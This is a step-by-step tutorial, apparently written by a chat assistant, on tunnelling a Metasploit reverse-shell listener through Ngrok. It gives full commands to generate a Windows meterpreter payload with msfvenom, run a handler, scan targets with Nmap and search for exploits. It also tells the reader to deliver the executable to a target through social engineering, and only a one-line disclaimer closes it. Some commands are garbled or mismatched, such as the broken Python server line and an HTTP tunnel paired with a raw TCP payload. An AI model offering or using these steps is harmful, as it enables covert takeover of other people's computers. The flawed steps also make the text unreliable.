### Comprehensive Tutorial: Setting Up Ngrok and Metasploit for Remote Penetration Testing on Ubuntu WSL2

This tutorial will guide you through the process of installing and configuring Ngrok and Metasploit on Ubuntu WSL2. You will learn how to expose a local web server to the internet using Ngrok and set up a reverse shell using Metasploit to perform penetration testing.

#### Step 1: Install Ngrok
1. Run the following one-liner command to install Ngrok:
    sh
   curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok -y

#### Step 2: Set Up an Ngrok Account
1. Sign up for an account on the [Ngrok website](https://ngrok.com/).
2. After signing up, you will get an authentication token. Use this token to authenticate your Ngrok installation:
    sh
   ngrok authtoken YOUR_AUTH_TOKEN

#### Step 3: Run a Local Web Server
1. Install a simple web server if you don't have one. For example, you can use Python's built-in HTTP server:
    sh
    3 -m http.server 8080

#### Step 4: Expose Your Local Server Using Ngrok
1. Use Ngrok to create a secure tunnel to your local server:
    sh
   ngrok http 8080
2. Ngrok will provide you with a public URL that tunnels to your local web server. Note the URL provided by Ngrok, which should look something like `https://cb44-2-54-42-204.ngrok-free.app`.

#### Step 5: Install Metasploit
1. Install Metasploit using Snap:
    sh
   sudo snap install metasploit-framework
2. Start Metasploit:
    sh
   sudo msfconsole

#### Step 6: Create a Payload with Metasploit
1. Use Metasploit to create a reverse shell payload. This example uses a Windows payload:
    sh
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=cb44-2-54-42-204.ngrok-free.app LPORT=80 -f exe > payload.exe
   Replace `cb44-2-54-42-204.ngrok-free.app` with the URL provided by Ngrok and `80` with the port.

#### Step 7: Set Up a Listener in Metasploit
1. In Metasploit, set up a listener to catch the reverse shell:
    sh
   use exploit/multi/handler
2. Set the payload for the listener:
    sh
   set payload windows/meterpreter/reverse_tcp
3. Set the `LHOST` to `0.0.0.0` (this means it will listen on all available network interfaces):
    sh
   set LHOST 0.0.0.0
4. Set the `LPORT` to `80`:
    sh
   set LPORT 80
5. Run the handler:
    sh
   run

#### Step 8: Deliver the Payload
1. Deliver the `payload.exe` to the target device. This step often involves social engineering to convince the user to run the payload.

#### Step 9: Gaining Control with Metasploit
Once the target device executes the payload, Metasploit will catch the reverse shell, giving you control over the device.

### Example Scenario: Penetration Testing Using Ngrok and Metasploit

Here's a more specific example based on the files you uploaded, utilizing web-based attacks and reverse shells.

#### Step 1: Reconnaissance with Nmap
- Use Nmap to scan the network:
   sh
  nmap -p- -T4 --min-rate=1000 <target-ip>

#### Step 2: Exploit Vulnerability
- Find an exploit for the target service (e.g., a web server with a known vulnerability):
   sh
  search exploit name
  use exploit/multi/http/exploit_name

#### Step 3: Set Up Reverse Shell with Ngrok and Metasploit
- Set up Ngrok to tunnel the connection:
   sh
  ngrok tcp 4444
- Configure Metasploit handler:
   sh
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set LHOST 0.tcp.ngrok.io
  set LPORT <ngrok_port>
  run

### Detailed Instructions for Handling Errors in Metasploit
If you encounter the errors:
 plaintext
Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Error: One or more options failed to validate: LHOST, LPORT.
Follow these steps to resolve them:

1. Ensure you have set the `LHOST` and `LPORT` correctly in the payload creation step:
    sh
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=cb44-2-54-42-204.ngrok-free.app LPORT=80 -f exe > payload.exe
2. Double-check the values in the handler setup:
    sh
   set payload windows/meterpreter/reverse_tcp
   set LHOST 0.0.0.0
   set LPORT 80
3. If the `LHOST` or `LPORT` are not correctly set, ensure you re-enter them:
    sh
   set LHOST cb44-2-54-42-204.ngrok-free.app
   set LPORT 80

By following these steps, you can expose a local web server to the internet using Ngrok and then proceed with penetration testing or exploitation activities using tools like Metasploit. Remember, this guide is for educational purposes, and unauthorized access to systems is illegal. Always ensure you have permission before conducting any penetration testing.
